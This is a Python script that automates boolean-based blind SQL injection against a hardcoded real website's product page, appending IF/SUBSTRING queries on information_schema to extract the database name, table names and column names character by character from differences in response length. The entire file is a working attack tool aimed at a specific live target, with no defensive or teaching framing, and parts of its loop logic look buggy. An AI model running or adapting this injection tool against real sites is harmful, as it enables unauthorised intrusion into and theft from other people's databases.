# ---------- * imports * ----------
import requests

# ---------- * constants * ----------

LETRAS = ["a", "e", "o", "s", "r", "i", "n", "d", "m", "u",
            "t", "c", "l", "p", "v", "g", "h", "q", "b", "f",
            "z", "j", "x", "k", "w", "y", "_", "-", ".", "0", "1",
            "2", "3", "4", "5", "6", "7", "8", "9", ":", "?",
            "@", "!", "#", "$", "%", "&", "*", "(", ")",
            "+", "="]

URL = "https://www.adtecnet.com.br/produto.php?id=19"

# ---------- * FUNCTIONS * ----------

# def get_request(query): 
#     new_url = URL + query
#     response = requests.get(new_url) # .. make request ..
#     content = response.content # .. gets request content ..
#     request_content_len_new = len(content) # .. gets request content length ..

#     return request_content_len_new

# .. finds database name length ..
def gets_dbname_length(request_content_len):
    i = 1
    dbname_length = 0

    while dbname_length == 0:
        print(f"trying length on dbname: {i}")
        new_url = URL + f"%20and%20IF(length(database())={i},1,NULL)" # .. sets query ..
        response = requests.get(new_url) # .. make request ..
        content = response.content # .. gets request content ..
        request_content_len_new = len(content) # .. gets content request length ..

        # .. if query returns true, meaning database name length was found ..
        if request_content_len_new == request_content_len:
            dbname_length = i
            print(f"FOUND DBNAME LENGTH: {dbname_length}")

        # .. if returns false, tries next number ..
        else:
            i += 1
    
    return dbname_length


# .. finds database name ..
def gets_dbname(request_content_len, dbname_length):
    i = 1
    db_name = []
    
    # .. while i less than dbname length ..
    while i <= dbname_length:
        for letra in LETRAS:
            print(f"trying letter on dbname: {letra}")
            new_url = URL + f"%20and%20IF(SUBSTRING(database(),{i},1)='{letra}',1,NULL)" # .. sets query ..
            
            response = requests.get(new_url) # .. make request ..
            content = response.content # .. gets request content ..
            request_content_len_new = len(content) # .. gets request content length ..

            # .. if query returns true, meaning letter is in dbname ..
            if request_content_len_new == request_content_len:
                db_name.append(letra.lower()) # .. adds letter to array ..
                print(f"FOUND LETTER: {db_name}")
                break

        i += 1 # .. tries for next letter in dbname ..

    db_name_str = "".join(db_name)

    return db_name_str.lower()


# .. find qty of tables
def gets_qty_tables(request_content_len):
    i = 1
    request_content_len_new = 0

    while True:
        print(f"trying length on qty tables: {i}")
        new_url = URL + f"%20and%20IF((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%20=%20%27{db_name}%27)={i},1,NULL)" # .. sets query ..
        response = requests.get(new_url) # .. make request ..
        content = response.content # .. gets request content ..
        request_content_len_new = len(content) # .. gets request content length ..

        # .. verifies if query returns true by comparing request content length ..
        if request_content_len_new != request_content_len:
            i += 1
        else:
            break

    print(f"FOUND QTY OF TABLES: {i}")
    return i

# .. find table's names
def gets_tables_names(db_name, request_content_len, qty_tables):
    array_tables = []
    k = 1
    limit = f"1"

    # .. pass throught all tables
    while k < qty_tables:
        i = 1
        j = 0
        tables = []

        while True:
            print(f"trying letter on table name: {LETRAS[j]}")
            new_url = URL + f"%20and%20IF(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{LETRAS[j]}%27,%201,%20NULL)" # .. sets query ..
            response = requests.get(new_url) # .. make request ..
            content = response.content # .. gets request content ..
            request_content_len_new = len(content) # .. gets request content length ..
                
            # .. if query returns true, meaning letter is in table name ..
            if request_content_len_new == request_content_len:
                tables.append(LETRAS[j]) # .. keeps letter found in array ..
                print(tables)

                table_name = "".join(tables) # .. turns array into string ..
                query = URL + f"%20and%20IF((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%20{limit})=%27{table_name}%27,%201,%20NULL)" # .. sets query ..

                response = requests.get(query) # .. make request ..
                content = response.content # .. gets request content ..
                request_content_len_new = len(content) # .. gets request content length ..

                # .. if query returns true, meaning table name was found ..
                if request_content_len_new == request_content_len:
                    print(f"table name: {table_name}")

                    array_tables.append(table_name)
                    print("number of tables: " + str(len(array_tables) + 1))

                    k += 1 # .. changes limit to get to table number ..
                    limit = (f"{k}, 1")
                    break

                # .. if query returns false,  ..
                else:     
                    i += 1 # .. change query to verify next letter ..
                    j = 0 # .. resets letter array to start at letter A ..
            
            # .. if query returns false, tries next letter ..
            else:
                j += 1

    return array_tables


# .. find table's names ..
def gets_qty_columns(tables_names, request_content_len, qty_tables):
    i = 1
    j = 0
    qty_columns = []

    # .. while j less than qty tables
    while j < qty_tables:
        print(f"TRYING FOR TABLE: {tables_names[j]}") 

        # .. while qty of columns of each table is not found 
        while True:
            new_url = URL + f"%20and%20IF((select%20count(*)%20from%20information_schema.columns%20where%20table_name%20=%20%27{tables_names[j]}%27)={i},1,NULL)" # .. sets query ..
            response = requests.get(new_url) # .. makes request ..
            content = response.content # .. gets request content ..
            request_content_len_new = len(content) # .. gets request content length ..

            # .. if query returns false, meaning letter isnt in table name, tries next letter ..
            if request_content_len_new != request_content_len:
                i += 1

            # .. if query returns true, saves qty in array and goes for next table ..
            else:
                j += 1
                qty_columns.append(i)
                print(f"QTY COLUMNS FOUND: {qty_columns}")
                i = 1
                break

    return qty_columns


# .. gets columns names ..
def gets_columns_names(request_content_len, qty_columns, tables_names, qty_tables):
    
    array_columns = []
    j = 0
    k = 0
    l = 0
    m = 0
    while True:
        limit: str = "1"
        columns_names = []
        while k < qty_columns[m]:
            j = 0
            i = 1
            columns = []
            print(f"on column {m}, on table {tables_names[l]}")
            while True:
                    new_url = URL + f"%20and%20IF(SUBSTRING((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27{tables_names[l]}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{LETRAS[j]}%27,%201,%20NULL)"
                    print(f"trying letter {LETRAS[j]}")
                    response = requests.get(new_url)
                    content = response.content
                    request_content_len_new = len(content)
                    
                    if request_content_len_new == request_content_len:
                        columns.append(LETRAS[j])
                        print(f"FOUND LETTER: {LETRAS[j]}")

                        column_name = "".join(columns) 
                        query = URL + f"%20and%20IF((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27{tables_names[l]}%27%20LIMIT%20{limit})=%27{column_name}%27,%201,%20NULL)"
                        response = requests.get(query)
                        content = response.content
                        request_content_len_new = len(content)
                        if request_content_len_new == request_content_len:
                            print(f"nome column: {column_name}")
                            columns_names.append(column_name.lower())
                            array_columns.append(columns_names)
                            columns_names = []
                            print(F"COLUMN NAME FOUND: {array_columns}")
                            k += 1
                            limit = (f"{k + 1}, 1")
                            break
                        else:     
                            i += 1
                            j = 0
                    else:
                        j += 1
        if m == qty_tables:
            break
        else:
            l += 1
            m += 1
    return array_columns


if __name__ == '__main__':

    database: str = 'database'
    print(f"{database:_^20}")

    # .. verifies if url is valid ..
    if '=' in URL:
        print("Começando o Scanning.")
    else:
        print("Verifique se a URL contem o motedo GET.")

    response = requests.get(URL) # .. makes request on pure url ..

    # .. if its up ..
    if response.status_code == 200:
        request_content = response.content # .. gets request content ..
        request_content_len = len(request_content) # .. gets request content length ..
        print(f"DEFAULT REQUEST CONTENT LENGTH: {request_content_len}")

        dbname_length = gets_dbname_length(request_content_len) # .. gets db name length ..
        db_name = gets_dbname(request_content_len, dbname_length) # .. gets db ..
        print(f"DATABASE NAME: {db_name}")

        qty_tables = gets_qty_tables(request_content_len) # .. gets qty of tables ..
        tables_names = gets_tables_names(db_name, request_content_len, qty_tables) # .. gets tables names ..
        print(f"TABLES NAMES: {tables_names}")

        # tables_names = ["cat", "suporte"]
        # qty_tables = 2

        qty_columns = gets_qty_columns(tables_names, request_content_len, qty_tables)
        print(qty_columns)
        
        columns_names = gets_columns_names(request_content_len, qty_columns, tables_names, qty_tables)
        print(columns_names)
            
    else:
        print("O servidor não respondeu :(")
